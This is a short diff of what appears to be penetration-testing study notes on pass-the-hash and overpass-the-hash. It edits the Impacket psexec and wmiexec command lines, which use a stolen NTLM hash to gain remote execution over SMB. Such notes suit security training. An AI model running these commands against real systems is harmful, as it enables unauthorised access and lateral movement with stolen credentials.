@@ -57,8 +57,8 @@ Enter-PSSession {PSSession_ID_returned}
 - PsExec, Passing-the-hash toolkit, and Impacket can all pass hashes
 - SMB must be open
 - Impacket:
-	- `impacket-psexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}` and
-	- `impacket-wmiexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}`
+	- `impacket-psexec -hashes :{hash} {DOMAIN}/{user}@{IP}` and
+	- `impacket-wmiexec -hashes :{hash} {DOMAIN}/{user}@{IP}`
 
 ## Overpass the Hash
 - Use an NTLM user hash to gain a full Kerberos TGT to get a TGS
